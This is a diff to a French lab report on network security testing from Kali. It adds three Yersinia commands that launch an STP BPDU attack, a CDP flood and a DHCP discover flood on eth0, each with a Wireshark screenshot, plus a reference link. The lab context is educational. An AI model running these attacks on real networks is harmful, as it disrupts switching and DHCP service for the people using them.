@@ -168,6 +168,31 @@ Dans notre environnement, Yersinia n'etait pas disponible avec l'interface graph
 sudo yersinia -I -i eth0
 ```
 
+Cette commande lance une attaque BPDU (Bridge Protocol Data Unit) sur l’interface eth0.
+
+```bash
+sudo yersinia stp -attack bpdu -interface eth0
+```
+
+![wireshark stp](../../assets/img/admin-reseau-securisation/it-1/attaque%20stp.png)
+
+Cette commande lance une attaque de type « flood » sur l’interface eth0, envoyant des paquets CDP massifs pour perturber le réseau.
+
+```bash
+
+sudo yersinia cdp -attack flood -interface eth0
+```
+
+![wireshark cdp](../../assets/img/admin-reseau-securisation/it-1/attaqueflood.png)
+
+Cette commande lance une attaque de type « discover » sur l’interface eth0, inondant le serveur DHCP de requêtes de découverte.
+
+```bash
+sudo yersinia dhcp -attack discover -interface eth0
+```
+
+![wireshark dhcp](../../assets/img/admin-reseau-securisation/it-1/dhcpattack.png)
+
 Pour capturer les protocoles Cisco visibles depuis Kali, Wireshark a ete utilise avec les filtres suivants :
 
 ```text
@@ -452,6 +477,7 @@ Le point important a retenir est qu'une segmentation VLAN doit toujours etre acc
 - Yersinia documentation : <https://github.com/tomac/yersinia>
 - Wireshark : <https://www.wireshark.org/>
 - Skill VLAN Hopping : <https://lobehub.com/skills/>
+- Yersinia sur kali : <https://www.kalilinux.fr/commandes/yersinia-sur-kali-linux/>
 
 ## Notions acquises
 
